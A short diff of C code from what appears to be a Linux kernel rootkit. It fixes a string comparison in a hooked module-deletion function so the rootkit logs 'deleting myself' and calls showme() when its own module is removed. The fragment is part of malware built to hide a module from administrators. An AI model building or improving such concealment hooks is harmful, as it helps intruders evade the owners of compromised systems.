@@ -71,9 +71,10 @@ asmlinkage long delete_module_func(const char __user *name_user, unsigned int fl
     mod = find_module(module_name);
     printk(KERN_INFO "Module %s was deleted\n", mod.name);
 
-    if  (strcmp(mod.name,rootkit_name)){
+    if  (strcmp(mod.name,rootkit_name) == 0){
+        printk(KERN_INFO "deleting myself");
         showme();
-    } 
+    }  
 
 done:
 
